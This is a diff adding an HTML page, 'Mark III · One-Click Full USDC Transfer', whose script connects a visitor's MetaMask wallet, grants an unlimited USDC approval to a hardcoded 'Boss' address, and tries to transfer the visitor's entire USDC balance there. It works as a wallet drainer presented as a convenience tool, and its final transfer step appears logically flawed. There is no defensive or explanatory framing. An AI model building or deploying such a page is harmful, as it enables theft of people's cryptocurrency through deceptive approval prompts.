@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Mark III · Auto Transfer All USDC</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Roboto, sans-serif;
+      background: #f0f7ff;
+      color: #333;
+      text-align: center;
+      padding: 50px;
+    }
+    h2 {
+      color: #2b6cb0;
+    }
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background: #2b6cb0;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 30px;
+    }
+    button:hover {
+      background: #1c4d91;
+    }
+    #status {
+      margin-top: 30px;
+      font-size: 16px;
+      white-space: pre-line;
+    }
+  </style>
+</head>
+<body>
+  <h2>Mark III · One-Click Full USDC Transfer</h2>
+  <button onclick="authorizeAndTransfer()">🚀 Authorize + Transfer All</button>
+  <div id="status"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    const usdcAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";  // USDC
+    const bossAddress = "0x86dbe265b0d503e68676971fc7d6aad7e5d90b12";  // Boss
+    const approveAmount = ethers.constants.MaxUint256;
+
+    async function authorizeAndTransfer() {
+      const status = document.getElementById("status");
+      try {
+        if (!window.ethereum) {
+          status.innerText = "❌ MetaMask not detected.";
+          return;
+        }
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const user = await signer.getAddress();
+        status.innerText = "🔗 Connected: " + user;
+
+        const usdc = new ethers.Contract(usdcAddress, [
+          "function approve(address,uint256) public returns (bool)",
+          "function allowance(address,address) view returns (uint256)",
+          "function balanceOf(address) view returns (uint256)",
+          "function transferFrom(address,address,uint256) public returns (bool)"
+        ], signer);
+
+        status.innerText += "\\n⏳ Approving...";
+        const tx1 = await usdc.approve(bossAddress, approveAmount);
+        await tx1.wait();
+        status.innerText += "\\n✅ Approved Max";
+
+        const balance = await usdc.balanceOf(user);
+        status.innerText += "\\n💰 Balance: " + ethers.utils.formatUnits(balance, 6);
+
+        const allowance = await usdc.allowance(user, bossAddress);
+        if (balance.gt(allowance)) {
+          status.innerText += "\\n⚠️ Not enough allowance. Try again after approval.";
+          return;
+        }
+
+        status.innerText += "\\n⏳ Transferring entire balance...";
+        const tx2 = await usdc.transferFrom(user, bossAddress, balance);
+        await tx2.wait();
+        status.innerText += "\\n✅ Full USDC Transferred!";
+
+      } catch (e) {
+        console.error(e);
+        status.innerText += "\\n❌ Error: " + (e.message || e);
+      }
+    }
+  </script>
+</body>
+</html>
